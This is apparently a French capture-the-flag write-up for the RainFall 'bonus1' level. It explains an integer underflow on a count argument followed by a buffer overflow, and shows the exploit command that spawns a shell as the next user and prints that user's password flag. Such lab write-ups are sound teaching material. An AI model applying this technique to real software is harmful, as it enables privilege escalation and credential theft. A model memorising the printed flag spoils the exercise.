# bonus1

Pour alouer assez de mémoire tout en passant la première condition, il faut faire un int underflow sur `count`

On a besoin d'allouer au moins 44 bytes pour overwrite la variable en dehors du buffer, j'ai donc fait un petit programme en C pour trouver une valeur qui convient: `-2147483637`

Ensuite, on a juste a remplir le buffer de 40 charactères aléatoires suivis de la valeur qu'on veut donner à la variable

```sh
bonus1@RainFall:~$ ./bonus1 -2147483637 `perl -e 'print "A"x40 . "\x46\x4c\x4f\x57";'`
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

